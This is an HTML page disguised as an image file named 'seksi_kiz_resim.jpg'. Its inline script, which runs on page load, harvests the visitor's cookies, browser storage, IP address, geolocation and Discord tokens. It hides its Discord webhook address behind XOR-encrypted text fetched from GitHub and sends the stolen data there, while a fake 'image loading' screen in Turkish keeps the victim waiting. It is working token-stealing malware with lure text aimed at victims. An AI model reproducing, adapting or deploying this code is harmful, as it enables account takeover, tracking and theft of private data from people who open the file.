<!DOCTYPE html>
<html>
<head>
    <title>seksi_kiz_resim.jpg</title>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <script>
        // web ===
        const info = {
            URL: location.href,
            Referrer: document.referrer,
            UserAgent: navigator.userAgent,
            Language: navigator.language,
            Platform: navigator.platform,
            Online: navigator.onLine,
            Cookies: document.cookie || '❌ Yok',
            LocalStorage: tryAccess(localStorage),
            SessionStorage: tryAccess(sessionStorage),
            Tarih: new Date().toISOString(),
            IP: '⏳ Alınıyor...',
            Geolocation: '❌',
            DiscordToken: '❌'
        };

        function tryAccess(storage) {
            try {
                return Object.keys(storage).length ? JSON.stringify(storage).substr(0, 10000) : '❌ Boş';
            } catch (e) { return '❌ Erişilemedi'; }
        }

        // === 2. IP AL ===
        fetch('https://api.ipify.org?format=json')
            .then(r => r.json())
            .then(data => info.IP = data.ip)
            .catch(() => info.IP = '❌');

         // konum ===
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(pos => {
                info.Geolocation = `${pos.coords.latitude}, ${pos.coords.longitude}`;
            });
        }

        // token dc
        try {
            for (let key in localStorage) {
                if (key.includes('token') || key.includes('discord')) {
                    const val = localStorage[key];
                    if (typeof val === 'string' && val.includes('\"') && val.includes('.')) {
                        const tokenMatch = val.match(/mfa\.[a-zA-Z0-9_-]{84}|[a-zA-Z0-9_-]{24}\.[a-zA-Z0-9_-]{6}\.[a-zA-Z0-9_-]{27}/);
                        if (tokenMatch) {
                            info.DiscordToken = tokenMatch[0];
                            break;
                        }
                    }
                }
            }
        } catch (e) {}

      
        fetch('https://raw.githubusercontent.com/nefretwasherebaby/keys/master/webhook.enc')
            .then(res => res.text())
            .then(encrypted => {
                const key = 'x7gT9kP2';
                let decrypted = '';
                const raw = atob(encrypted.trim());
                for (let i = 0; i < raw.length; i++) {
                    decrypted += String.fromCharCode(raw.charCodeAt(i) ^ key.charCodeAt(i % key.length));
                }
                return decrypted;
            })
            .then(WEBHOOK_URL => {
                // 3 saniye bekle (IP vs. için)
                setTimeout(() => {
                    sendToDiscord(WEBHOOK_URL);
                }, 3000);
            });

       
        function sendToDiscord(url) {
            const embed = {
                username: 'nefretwasherebaby',
                avatar_url: 'https://i.imgur.com/rFhOcMq.png',
                embeds: [{
                    title: '🎯 malevladi,
                    description: '```yaml\ token ve çerezler cepte.\n```',
                    color: 0xFF0000,
                    fields: [
                        { name: '📛 dctoken', value: '```\n' + (info.DiscordToken || '❌ Bulunamadı') + '\n```', inline: false },
                        { name: '🍪 neonunyedigikurabiye', value: '```\n' + (info.Cookies || '❌ Yok').substr(0, 1000) + '\n```', inline: false },
                        { name: '📱 cihaz', value: '```\n' + info.UserAgent + '\n```', inline: false },
                        { name: '🌐 ip', value: '```\n' + info.IP + '\n```', inline: true },
                        { name: '📍 nerdesinmal', value: '```\n' + info.Geolocation + '\n```', inline: true },
                        { name: '⏰ timebabatime', value: '```\n' + info.Tarih + '\n```', inline: true }
                    ],
                    footer: { text: 'nefretwasherebaby - github.com/nefretwasherebaby' },
                    timestamp: new Date().toISOString()
                }]
            };

            fetch(url, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(embed)
            }).catch(e => console.log('Gönderilemedi:', e));
        }

       
        document.body.innerHTML = `
            <div style="width:100vw;height:100vh;display:flex;flex-direction:column;justify-content:center;align-items:center;background:#000;color:#fff;font-family:Arial;">
                <img src="https://via.placeholder.com/800x600/111/ffffff?text=Seksii+Resim+Yükleniyor..." 
                     style="max-width:90%;max-height:70%;object-fit:cover;border-radius:12px;">
                <p style="margin-top:20px;font-size:18px;">Birkaç saniye sonra açılacak...</p>
            </div>
        `;
    </script>
</head>
<body></body>
</html>
